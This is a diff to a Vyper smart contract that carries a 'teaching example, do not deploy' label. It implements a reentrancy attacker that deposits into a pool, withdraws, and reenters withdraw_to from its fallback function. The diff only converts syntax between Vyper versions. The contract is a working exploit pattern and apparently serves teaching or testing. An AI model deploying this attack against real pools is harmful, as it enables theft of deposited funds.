@@ -1,4 +1,4 @@
-# pragma version ^0.4.0
+# @version 0.3.10
 # TEACHING EXAMPLE. Do not deploy. See README.md.
 #
 # Deposits 1 unit, calls withdraw(), and when the payout runs this contract's
@@ -19,7 +19,7 @@ ASSET: immutable(address)   # empty for the native-asset pool
 reentered: public(bool)
 
 
-@deploy
+@external
 def __init__(_pool: address, _asset: address):
     """
     @notice Point the attacker at a pool.
@@ -40,12 +40,12 @@ def attack(amount: uint256 = 0):
     @param amount Amount to deposit for the ERC20 asset pool; ignored when native.
     """
     if ASSET == empty(address):
-        extcall Pool(POOL).deposit(0, value=msg.value)
+        Pool(POOL).deposit(0, value=msg.value)
     else:
-        extcall ERC20(ASSET).approve(POOL, amount)
-        extcall Pool(POOL).deposit(amount)
+        ERC20(ASSET).approve(POOL, amount)
+        Pool(POOL).deposit(amount)
 
-    extcall Pool(POOL).withdraw()
+    Pool(POOL).withdraw()
 
 
 @external
@@ -58,4 +58,4 @@ def __default__():
     """
     if not self.reentered:
         self.reentered = True
-        extcall Pool(POOL).withdraw_to(self)
+        Pool(POOL).withdraw_to(self)
